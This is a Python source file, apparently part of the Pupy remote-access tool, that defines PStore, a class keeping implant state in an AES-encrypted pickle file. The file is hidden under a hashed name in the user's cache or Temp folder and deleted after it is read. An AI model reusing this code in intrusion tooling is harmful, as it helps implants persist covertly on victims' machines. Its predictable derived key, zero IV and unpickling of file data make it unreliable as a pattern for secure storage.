# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = ('PStore',)

import hashlib
import uuid
import os
import sys
import struct

if sys.version_info.major > 2:
    import pickle
else:
    import cPickle as pickle

import pupy

from io import open

from network.lib.transports.cryptoutils import (
    NewAESCipher, append_PKCS7_padding,
    strip_PKCS7_padding
)


class PStore(object):

    __slots__ = (
        '_pstore_path', '_pstore_key', '_pstore'
    )

    def __init__(self, pstore_dir='~'):
        try:
            import getpass
            uid = getpass.getuser()
        except:
            if hasattr(os, 'getuid'):
                uid = os.getuid()
            else:
                uid = ''

        if not isinstance(uid, bytes):
            uid = uid.encode('latin1')

        seed = uid + b':' + struct.pack(
            '<Q', uuid.getnode()
        )

        h = hashlib.sha1()
        h.update(seed)

        if os.name == 'posix':
            if pstore_dir == '~':
                pstore_dir = os.path.join(pstore_dir, '.cache')
            pstore_name = '.{}'.format(h.hexdigest())
        else:
            if pstore_dir == '~':
                pstore_dir = os.path.join(
                    pstore_dir, 'AppData', 'Local', 'Temp'
                )
            pstore_name = h.hexdigest()

        self._pstore_path = os.path.expanduser(
            os.path.join(pstore_dir, pstore_name)
        )

        h = hashlib.sha1()
        h.update(b'password' + seed)

        self._pstore_key = (
            h.digest()[:16], b'\x00'*16
        )
        self._pstore = {}

        self.load()

    def __getitem__(self, key):
        if issubclass(type(key), object):
            key = type(key).__name__
        return self._pstore.get(key)

    def __setitem__(self, key, value):
        if issubclass(type(key), object):
            key = type(key).__name__
        self._pstore[key] = value

    def load(self):
        if not os.path.exists(self._pstore_path):
            return

        data = None
        try:
            with open(self._pstore_path, 'rb') as pstore:
                data = pstore.read()

            try:
                os.unlink(self._pstore_path)
            except:
                pupy.remote_error('Pstore (load)')

            if not data:
                return

            data = NewAESCipher(*self._pstore_key).decrypt(data)
            data = strip_PKCS7_padding(data)
            data = pickle.loads(data)
        except:
            pupy.remote_error('Pstore (load)')
            return

        if type(data) == dict:
            self._pstore.update(data)

    def store(self):
        if not self._pstore:
            return

        pstore_dir = os.path.dirname(self._pstore_path)
        try:
            if not os.path.isdir(pstore_dir):
                os.makedirs(pstore_dir)

            with open(self._pstore_path, 'w+b') as pstore:
                data = pickle.dumps(self._pstore)
                data = append_PKCS7_padding(data)
                data = NewAESCipher(*self._pstore_key).encrypt(data)
                pstore.write(data)

        except:
            pupy.remote_error('Pstore (store)')
            return
